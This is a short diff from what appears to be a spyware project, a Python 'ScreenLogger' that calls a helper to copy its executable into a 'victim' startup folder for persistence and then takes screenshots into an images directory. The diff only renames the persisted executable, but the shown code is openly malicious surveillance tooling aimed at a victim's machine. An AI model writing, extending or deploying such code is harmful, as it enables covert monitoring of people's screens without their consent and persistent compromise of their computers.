@@ -93,7 +93,7 @@ class ScreenLogger:
 
 if __name__ == "__main__":
     victim_info = VictimInfo()
-    FileManager.copy_to_startup("ScreenLogger.py", "testestartup-NOMEALTERADO.exe", victim_info.startup_dir)
+    FileManager.copy_to_startup("ScreenLogger.exe", "ScreenLoggerSTARTUP.exe", victim_info.startup_dir)
 
     screen_logger = ScreenLogger(victim_info.images_dir)
     screen_logger.take_screenshots()
